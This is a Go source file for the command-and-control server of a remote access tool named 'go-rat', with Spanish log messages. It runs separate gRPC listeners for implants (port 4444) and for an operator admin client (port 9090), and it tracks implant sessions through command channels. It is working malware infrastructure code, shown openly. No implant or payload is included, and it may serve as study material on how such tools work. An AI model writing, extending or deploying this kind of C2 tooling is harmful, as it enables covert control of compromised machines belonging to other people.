package main

import (
	"net"
	"net/http"
	_ "net/http/pprof"

	"github.com/google/uuid"
	"github.com/iortego42/go-rat/grpcapi"
	"github.com/iortego42/go-rat/log"
	"google.golang.org/grpc"
)

type session struct {
	in  chan *grpcapi.Command
	out chan *grpcapi.Command
}

var (
	logger                          = log.InitLogger()
	implants map[uuid.UUID]*session = make(map[uuid.UUID]*session)
)

func main() {
	var (
		implantListener, adminListener net.Listener
		err                            error
		opts                           []grpc.ServerOption
	)
	go func() {
		http.ListenAndServe("localhost:6060", nil)
	}()
	logger.SetLevel(log.DebugLevel)
	implant := newImplantServer()
	admin := newAdminServer()
	clientAddr := ":9090"
	implantAddr := ":4444"
	if implantListener, err = net.Listen("tcp", implantAddr); err != nil {
		logger.Debug(implantListener)
		logger.Fatal("Error en el listener del implant", "ERROR", err)
	}

	if adminListener, err = net.Listen("tcp", clientAddr); err != nil {
		logger.Debug(adminListener)
		logger.Fatal("Error en el listener del admin", "ERROR", err)
	}

	if adminListener == nil || implantListener == nil {
		logger.Fatal("No se puede escuchar.", "ERROR", "Los listeners son nil!!!")
	}

	grpcAdminServer, grpcImplantServer := grpc.NewServer(opts...), grpc.NewServer(opts...)
	if grpcAdminServer == nil || admin == nil {
		logger.Fatal("grpcAdmin server es nulo")
	}
	if grpcImplantServer == nil || implant == nil {
		logger.Fatal("grpcAdmin server es nulo")
	}
	grpcapi.RegisterAdminServer(grpcAdminServer, admin)
	grpcapi.RegisterImplantServer(grpcImplantServer, implant)
	go func() {
		logger.Infof("ImplantListener escuchando en %s", implantAddr)
		err = grpcImplantServer.Serve(implantListener)
		if err != nil {
			logger.Fatal(err)
		}
	}()
	logger.Infof("AdminListener escuchando en %s", clientAddr)
	err = grpcAdminServer.Serve(adminListener)
	if err != nil {
		logger.Fatal(err)
	}
}
